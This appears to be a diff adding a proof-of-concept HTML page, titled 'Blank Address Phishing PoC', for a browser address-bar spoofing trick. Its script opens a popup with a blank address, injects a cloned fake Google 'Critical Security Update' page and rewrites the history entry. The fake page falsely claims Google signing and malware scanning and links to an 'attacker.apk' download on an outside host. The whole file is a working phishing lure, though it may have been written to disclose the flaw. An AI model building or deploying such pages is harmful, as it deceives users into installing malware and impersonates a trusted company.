@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Blank Address Phishing PoC</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        text-align: center;
+        padding-top: 120px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        margin: 0;
+      }
+      button {
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 15px 28px;
+        font-size: 16px;
+        border-radius: 8px;
+        cursor: pointer;
+        box-shadow: 0 4px 15px rgba(26, 115, 232, 0.4);
+        transition: all 0.3s ease;
+      }
+      button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(26, 115, 232, 0.6);
+      }
+    </style>
+  </head>
+  <body>
+    <button id="open">Open Popup</button>
+
+    <div id="clone" style="display: none">
+      <style>
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+        }
+        body {
+          font-family: "Product Sans", "Google Sans", Roboto, "Segoe UI", Arial,
+            sans-serif;
+          background: linear-gradient(180deg, #f8f9fa 0%, #ffffff 100%);
+          color: #202124;
+          -webkit-font-smoothing: antialiased;
+          -moz-osx-font-smoothing: grayscale;
+          min-height: 100vh;
+        }
+        .header {
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          height: 64px;
+          background: #fff;
+          border-bottom: 1px solid #e0e0e0;
+          display: flex;
+          align-items: center;
+          padding: 0 24px;
+          z-index: 1000;
+          box-shadow: 0 1px 2px rgba(60, 64, 67, 0.1),
+            0 2px 6px rgba(60, 64, 67, 0.05);
+        }
+        .logo-section {
+          display: flex;
+          align-items: center;
+          gap: 12px;
+        }
+        .google-logo {
+          display: flex;
+          align-items: center;
+          gap: 2px;
+          font-size: 22px;
+          font-weight: 500;
+          letter-spacing: -0.5px;
+        }
+        .g-blue {
+          color: #4285f4;
+        }
+        .g-red {
+          color: #ea4335;
+        }
+        .g-yellow {
+          color: #fbbc05;
+        }
+        .g-blue2 {
+          color: #4285f4;
+        }
+        .g-green {
+          color: #34a853;
+        }
+        .g-red2 {
+          color: #ea4335;
+        }
+        .logo-text {
+          font-size: 20px;
+          color: #5f6368;
+          margin-left: 4px;
+          font-weight: 400;
+          letter-spacing: -0.2px;
+        }
+        .header-actions {
+          margin-left: auto;
+          display: flex;
+          gap: 8px;
+          align-items: center;
+        }
+        .header-btn {
+          padding: 8px 16px;
+          background: transparent;
+          border: 1px solid #dadce0;
+          border-radius: 4px;
+          font-size: 14px;
+          color: #5f6368;
+          cursor: pointer;
+          transition: all 0.2s;
+        }
+        .header-btn:hover {
+          background: #f8f9fa;
+          border-color: #dadce0;
+        }
+        .container {
+          max-width: 720px;
+          margin: 90px auto 0;
+          padding: 32px 24px 60px;
+        }
+        .breadcrumb {
+          font-size: 13px;
+          color: #5f6368;
+          margin-bottom: 20px;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        .breadcrumb-item {
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        .breadcrumb-separator {
+          color: #dadce0;
+        }
+        .update-card {
+          background: #fff;
+          border-radius: 12px;
+          box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3),
+            0 4px 8px 3px rgba(60, 64, 67, 0.15);
+          padding: 0;
+          overflow: hidden;
+          animation: fadeIn 0.5s ease-out;
+        }
+        @keyframes fadeIn {
+          from {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+        .card-header {
+          background: linear-gradient(
+            135deg,
+            #4285f4 0%,
+            #1967d2 50%,
+            #1a73e8 100%
+          );
+          padding: 40px 48px;
+          text-align: center;
+          color: white;
+          position: relative;
+          overflow: hidden;
+        }
+        .card-header::before {
+          content: "";
+          position: absolute;
+          top: -50%;
+          left: -50%;
+          width: 200%;
+          height: 200%;
+          background: radial-gradient(
+            circle,
+            rgba(255, 255, 255, 0.1) 0%,
+            transparent 70%
+          );
+          animation: pulse 3s ease-in-out infinite;
+        }
+        @keyframes pulse {
+          0%,
+          100% {
+            transform: scale(1) translate(0, 0);
+            opacity: 0.5;
+          }
+          50% {
+            transform: scale(1.1) translate(10%, 10%);
+            opacity: 0.8;
+          }
+        }
+        .update-icon-wrapper {
+          width: 80px;
+          height: 80px;
+          background: rgba(255, 255, 255, 0.25);
+          border-radius: 50%;
+          margin: 0 auto 24px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          backdrop-filter: blur(10px);
+          border: 3px solid rgba(255, 255, 255, 0.4);
+          position: relative;
+          animation: iconFloat 3s ease-in-out infinite;
+        }
+        @keyframes iconFloat {
+          0%,
+          100% {
+            transform: translateY(0);
+          }
+          50% {
+            transform: translateY(-8px);
+          }
+        }
+        .update-icon {
+          width: 44px;
+          height: 44px;
+          background: white;
+          border-radius: 10px;
+          position: relative;
+          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .update-icon::after {
+          content: "";
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          width: 0;
+          height: 0;
+          border-left: 11px solid transparent;
+          border-right: 11px solid transparent;
+          border-top: 16px solid #4285f4;
+        }
+        .card-title {
+          font-size: 28px;
+          font-weight: 400;
+          margin: 0 0 12px 0;
+          letter-spacing: -0.3px;
+          position: relative;
+          z-index: 1;
+        }
+        .card-subtitle {
+          font-size: 15px;
+          opacity: 0.95;
+          font-weight: 300;
+          line-height: 1.6;
+          position: relative;
+          z-index: 1;
+          max-width: 480px;
+          margin: 0 auto;
+        }
+        .card-body {
+          padding: 40px 48px 48px;
+        }
+        .alert-banner {
+          background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
+          border-left: 4px solid #f57c00;
+          border-radius: 8px;
+          padding: 16px 20px;
+          margin-bottom: 24px;
+          display: flex;
+          align-items: flex-start;
+          gap: 14px;
+          animation: slideIn 0.4s ease-out;
+        }
+        @keyframes slideIn {
+          from {
+            opacity: 0;
+            transform: translateX(-20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateX(0);
+          }
+        }
+        .alert-icon {
+          width: 24px;
+          height: 24px;
+          background: #f57c00;
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: white;
+          font-size: 14px;
+          font-weight: 700;
+          flex-shrink: 0;
+          margin-top: 2px;
+        }
+        .alert-content {
+          flex: 1;
+        }
+        .alert-title {
+          font-size: 14px;
+          color: #e65100;
+          font-weight: 600;
+          margin-bottom: 4px;
+        }
+        .alert-text {
+          font-size: 13px;
+          color: #ef6c00;
+          line-height: 1.5;
+        }
+        .status-banner {
+          background: linear-gradient(135deg, #e8f5e9 0%, #f1f8e9 100%);
+          border-left: 4px solid #34a853;
+          border-radius: 8px;
+          padding: 18px 20px;
+          margin-bottom: 32px;
+          display: flex;
+          align-items: center;
+          gap: 14px;
+          box-shadow: 0 2px 4px rgba(52, 168, 83, 0.1);
+        }
+        .status-icon {
+          width: 28px;
+          height: 28px;
+          background: #34a853;
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: white;
+          font-size: 16px;
+          font-weight: 700;
+          flex-shrink: 0;
+          box-shadow: 0 2px 8px rgba(52, 168, 83, 0.3);
+        }
+        .status-text {
+          font-size: 14px;
+          color: #137333;
+          font-weight: 500;
+          line-height: 1.5;
+          flex: 1;
+        }
+        .update-info {
+          background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+          border-radius: 10px;
+          padding: 0;
+          margin: 28px 0;
+          border: 1px solid #e8eaed;
+          box-shadow: 0 1px 3px rgba(60, 64, 67, 0.08);
+        }
+        .info-item {
+          padding: 18px 24px;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          border-bottom: 1px solid #e8eaed;
+          transition: background 0.2s;
+        }
+        .info-item:hover {
+          background: rgba(66, 133, 244, 0.02);
+        }
+        .info-item:last-child {
+          border-bottom: none;
+        }
+        .info-label {
+          font-size: 14px;
+          color: #5f6368;
+          font-weight: 500;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        .info-icon {
+          width: 18px;
+          height: 18px;
+          background: #e8eaed;
+          border-radius: 4px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-size: 11px;
+          color: #5f6368;
+        }
+        .info-value {
+          font-size: 14px;
+          color: #202124;
+          font-weight: 500;
+          text-align: right;
+        }
+        .info-value.success {
+          color: #1e8e3e;
+          font-weight: 600;
+          display: flex;
+          align-items: center;
+          gap: 6px;
+        }
+        .info-value.success::before {
+          content: "✓";
+          display: inline-block;
+          width: 18px;
+          height: 18px;
+          background: #34a853;
+          border-radius: 50%;
+          color: white;
+          font-size: 12px;
+          line-height: 18px;
+          text-align: center;
+        }
+        .progress-section {
+          margin: 28px 0 32px;
+          padding: 20px;
+          background: linear-gradient(135deg, #e8f0fe 0%, #f1f3f4 100%);
+          border-radius: 10px;
+          border: 1px solid #d2e3fc;
+        }
+        .progress-header {
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          margin-bottom: 12px;
+        }
+        .progress-label {
+          font-size: 13px;
+          color: #1967d2;
+          font-weight: 600;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        .progress-spinner {
+          width: 16px;
+          height: 16px;
+          border: 2px solid #e8eaed;
+          border-top-color: #1a73e8;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+          to {
+            transform: rotate(360deg);
+          }
+        }
+        .progress-status {
+          font-size: 13px;
+          color: #1e8e3e;
+          font-weight: 600;
+        }
+        .progress-bar {
+          width: 100%;
+          height: 8px;
+          background: #ffffff;
+          border-radius: 4px;
+          overflow: hidden;
+          position: relative;
+          box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .progress-fill {
+          height: 100%;
+          background: linear-gradient(
+            90deg,
+            #4285f4 0%,
+            #34a853 50%,
+            #fbbc05 100%
+          );
+          border-radius: 4px;
+          animation: progress 3s ease-in-out infinite;
+          box-shadow: 0 0 10px rgba(66, 133, 244, 0.5);
+          position: relative;
+        }
+        .progress-fill::after {
+          content: "";
+          position: absolute;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255, 255, 255, 0.3),
+            transparent
+          );
+          animation: shimmer 2s infinite;
+        }
+        @keyframes shimmer {
+          0% {
+            transform: translateX(-100%);
+          }
+          100% {
+            transform: translateX(100%);
+          }
+        }
+        @keyframes progress {
+          0% {
+            width: 45%;
+          }
+          50% {
+            width: 85%;
+          }
+          100% {
+            width: 95%;
+          }
+        }
+        .download-section {
+          margin: 32px 0 24px;
+        }
+        .download-button {
+          display: block;
+          width: 100%;
+          background: linear-gradient(
+            135deg,
+            #1a73e8 0%,
+            #1967d2 50%,
+            #1557b0 100%
+          );
+          color: white;
+          text-decoration: none;
+          padding: 16px 24px;
+          border-radius: 8px;
+          font-size: 16px;
+          font-weight: 600;
+          text-align: center;
+          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+          box-shadow: 0 2px 4px rgba(26, 115, 232, 0.3),
+            0 4px 12px rgba(26, 115, 232, 0.2);
+          border: none;
+          cursor: pointer;
+          position: relative;
+          overflow: hidden;
+          letter-spacing: 0.3px;
+        }
+        .download-button::before {
+          content: "";
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          width: 0;
+          height: 0;
+          border-radius: 50%;
+          background: rgba(255, 255, 255, 0.2);
+          transform: translate(-50%, -50%);
+          transition: width 0.6s, height 0.6s;
+        }
+        .download-button:hover::before {
+          width: 300px;
+          height: 300px;
+        }
+        .download-button:hover {
+          box-shadow: 0 4px 8px rgba(26, 115, 232, 0.4),
+            0 8px 20px rgba(26, 115, 232, 0.3);
+          transform: translateY(-2px);
+        }
+        .download-button:active {
+          transform: translateY(0);
+        }
+        .download-meta {
+          display: flex;
+          justify-content: center;
+          gap: 24px;
+          margin-top: 16px;
+          font-size: 13px;
+          color: #5f6368;
+        }
+        .download-meta-item {
+          display: flex;
+          align-items: center;
+          gap: 6px;
+        }
+        .security-features {
+          display: grid;
+          grid-template-columns: repeat(3, 1fr);
+          gap: 24px;
+          margin: 32px 0;
+          padding: 28px 0;
+          border-top: 1px solid #e8eaed;
+          border-bottom: 1px solid #e8eaed;
+        }
+        .feature-item {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          gap: 12px;
+          text-align: center;
+          padding: 16px;
+          border-radius: 8px;
+          transition: all 0.3s;
+        }
+        .feature-item:hover {
+          background: #f8f9fa;
+          transform: translateY(-4px);
+        }
+        .feature-icon {
+          width: 52px;
+          height: 52px;
+          background: linear-gradient(135deg, #e8f0fe 0%, #f1f3f4 100%);
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: #1a73e8;
+          font-size: 22px;
+          font-weight: 600;
+          border: 2px solid #d2e3fc;
+          box-shadow: 0 2px 8px rgba(26, 115, 232, 0.15);
+          transition: all 0.3s;
+        }
+        .feature-item:hover .feature-icon {
+          background: linear-gradient(135deg, #1a73e8 0%, #1967d2 100%);
+          color: white;
+          border-color: #1a73e8;
+          box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+        }
+        .feature-label {
+          font-size: 13px;
+          color: #5f6368;
+          font-weight: 500;
+          line-height: 1.4;
+        }
+        .changelog-section {
+          margin: 32px 0;
+          padding: 24px;
+          background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+          border-radius: 10px;
+          border: 1px solid #e8eaed;
+        }
+        .changelog-title {
+          font-size: 16px;
+          color: #202124;
+          font-weight: 600;
+          margin-bottom: 16px;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        .changelog-list {
+          list-style: none;
+          padding: 0;
+        }
+        .changelog-item {
+          padding: 12px 0;
+          border-bottom: 1px solid #e8eaed;
+          display: flex;
+          align-items: flex-start;
+          gap: 12px;
+        }
+        .changelog-item:last-child {
+          border-bottom: none;
+        }
+        .changelog-bullet {
+          width: 6px;
+          height: 6px;
+          background: #34a853;
+          border-radius: 50%;
+          margin-top: 8px;
+          flex-shrink: 0;
+        }
+        .changelog-text {
+          font-size: 14px;
+          color: #5f6368;
+          line-height: 1.6;
+        }
+        .footer-note {
+          font-size: 12px;
+          color: #80868b;
+          line-height: 1.7;
+          text-align: center;
+          margin-top: 28px;
+          padding: 24px;
+          background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+          border-radius: 8px;
+          border: 1px solid #e8eaed;
+        }
+        .footer-note strong {
+          color: #5f6368;
+          font-weight: 600;
+        }
+        .google-branding {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 8px;
+          margin-top: 32px;
+          padding-top: 28px;
+          border-top: 1px solid #e8eaed;
+        }
+        .branding-text {
+          font-size: 12px;
+          color: #80868b;
+          font-weight: 500;
+        }
+        .branding-logo {
+          font-size: 16px;
+          font-weight: 600;
+          letter-spacing: -0.3px;
+        }
+        .trust-seal {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 12px;
+          margin: 24px 0;
+          padding: 16px;
+          background: linear-gradient(135deg, #e8f5e9 0%, #f1f8e9 100%);
+          border-radius: 8px;
+          border: 1px solid #c8e6c9;
+        }
+        .trust-seal-icon {
+          width: 32px;
+          height: 32px;
+          background: #34a853;
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: white;
+          font-size: 18px;
+          font-weight: 700;
+          box-shadow: 0 2px 8px rgba(52, 168, 83, 0.3);
+        }
+        .trust-seal-text {
+          font-size: 13px;
+          color: #1e8e3e;
+          font-weight: 600;
+          line-height: 1.4;
+        }
+      </style>
+
+      <div class="header">
+        <div class="logo-section">
+          <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span
+            ><span class="g-yellow">o</span><span class="g-blue2">g</span
+            ><span class="g-green">l</span><span class="g-red2">e</span>
+          </div>
+          <span class="logo-text">Update Download</span>
+        </div>
+        <div class="header-actions">
+          <button class="header-btn">Help</button>
+          <button class="header-btn">Settings</button>
+        </div>
+      </div>
+
+      <div class="container">
+        <div class="breadcrumb">
+          <span class="breadcrumb-item">Home</span>
+          <span class="breadcrumb-separator">/</span>
+          <span class="breadcrumb-item">Updates</span>
+          <span class="breadcrumb-separator">/</span>
+          <span class="breadcrumb-item">Security Update 2025</span>
+        </div>
+
+        <div class="update-card">
+          <div class="card-header">
+            <div class="update-icon-wrapper">
+              <div class="update-icon"></div>
+            </div>
+            <h1 class="card-title">Critical Security Update Available</h1>
+            <p class="card-subtitle">
+              Important security patches and system improvements are ready to
+              install. This update includes enhanced protection features and
+              performance optimizations for your device.
+            </p>
+          </div>
+
+          <div class="card-body">
+            <div class="alert-banner">
+              <div class="alert-icon">!</div>
+              <div class="alert-content">
+                <div class="alert-title">Action Required</div>
+                <div class="alert-text">
+                  This security update addresses critical vulnerabilities.
+                  Install as soon as possible to keep your device protected.
+                </div>
+              </div>
+            </div>
+
+            <div class="status-banner">
+              <div class="status-icon">✓</div>
+              <div class="status-text">
+                Update package verified and digitally signed by Google. This
+                download has been scanned and is completely safe to install on
+                your device.
+              </div>
+            </div>
+
+            <div class="progress-section">
+              <div class="progress-header">
+                <div class="progress-label">
+                  <div class="progress-spinner"></div>
+                  Preparing secure download
+                </div>
+                <div class="progress-status">Ready</div>
+              </div>
+              <div class="progress-bar">
+                <div class="progress-fill"></div>
+              </div>
+            </div>
+
+            <div class="update-info">
+              <div class="info-item">
+                <span class="info-label">
+                  <span class="info-icon">📦</span>
+                  Update package
+                </span>
+                <span class="info-value">Security_Update_January_2025.apk</span>
+              </div>
+              <div class="info-item">
+                <span class="info-label">
+                  <span class="info-icon">💾</span>
+                  Package size
+                </span>
+                <span class="info-value">2.4 MB</span>
+              </div>
+              <div class="info-item">
+                <span class="info-label">
+                  <span class="info-icon">📅</span>
+                  Release date
+                </span>
+                <span class="info-value">January 4, 2026</span>
+              </div>
+              <div class="info-item">
+                <span class="info-label">
+                  <span class="info-icon">🔢</span>
+                  Version number
+                </span>
+                <span class="info-value">15.2.34.8945</span>
+              </div>
+              <div class="info-item">
+                <span class="info-label">
+                  <span class="info-icon">🔐</span>
+                  Verification status
+                </span>
+                <span class="info-value success">Digitally Signed</span>
+              </div>
+            </div>
+
+            <div class="changelog-section">
+              <div class="changelog-title">
+                📋 What's included in this update
+              </div>
+              <ul class="changelog-list">
+                <li class="changelog-item">
+                  <div class="changelog-bullet"></div>
+                  <div class="changelog-text">
+                    Enhanced security protocols and encryption standards
+                  </div>
+                </li>
+                <li class="changelog-item">
+                  <div class="changelog-bullet"></div>
+                  <div class="changelog-text">
+                    Critical vulnerability patches for system protection
+                  </div>
+                </li>
+                <li class="changelog-item">
+                  <div class="changelog-bullet"></div>
+                  <div class="changelog-text">
+                    Performance improvements and stability enhancements
+                  </div>
+                </li>
+                <li class="changelog-item">
+                  <div class="changelog-bullet"></div>
+                  <div class="changelog-text">
+                    Updated security certificates and authentication systems
+                  </div>
+                </li>
+              </ul>
+            </div>
+
+            <div class="trust-seal">
+              <div class="trust-seal-icon">✓</div>
+              <div class="trust-seal-text">
+                Google Verified Publisher - All updates are authenticated and
+                secure
+              </div>
+            </div>
+
+            <div class="download-section">
+              <a
+                href="https://azza0x1a.github.io/safarispoof/attacker.apk"
+                class="download-button"
+              >
+                Download Security Update Now
+              </a>
+              <div class="download-meta">
+                <div class="download-meta-item">
+                  <span>🔒</span>
+                  <span>Secure Connection</span>
+                </div>
+                <div class="download-meta-item">
+                  <span>⚡</span>
+                  <span>Fast Download</span>
+                </div>
+                <div class="download-meta-item">
+                  <span>✓</span>
+                  <span>Verified Source</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="security-features">
+              <div class="feature-item">
+                <div class="feature-icon">✓</div>
+                <span class="feature-label">Malware Protected</span>
+              </div>
+              <div class="feature-item">
+                <div class="feature-icon">✓</div>
+                <span class="feature-label">SSL Encrypted</span>
+              </div>
+              <div class="feature-item">
+                <div class="feature-icon">✓</div>
+                <span class="feature-label">Google Verified</span>
+              </div>
+            </div>
+
+            <div class="footer-note">
+              <strong>About this update:</strong> This security update is
+              distributed through Google's secure infrastructure and content
+              delivery network. All packages are automatically scanned for
+              malware, digitally signed with Google's certificates, and
+              encrypted during transmission to ensure authenticity and security.
+              By downloading this update, you agree to Google's Terms of Service
+              and Privacy Policy.
+            </div>
+
+            <div class="google-branding">
+              <span class="branding-text">Secured and powered by</span>
+              <span class="branding-logo">
+                <span class="g-blue">G</span><span class="g-red">o</span
+                ><span class="g-yellow">o</span><span class="g-blue2">g</span
+                ><span class="g-green">l</span><span class="g-red2">e</span>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let w;
+      document.getElementById("open").onclick = () => {
+        w = window.open(
+          "javascript:void(0)",
+          "_blank",
+          "location=no,toolbar=no,status=no"
+        );
+        setTimeout(() => {
+          const c = document.getElementById("clone").cloneNode(true);
+          c.style.display = "block";
+          w.document.body.innerHTML = "";
+          w.document.body.appendChild(c);
+          w.history.replaceState(null, "", "/");
+        }, 150);
+      };
+    </script>
+  </body>
+</html>
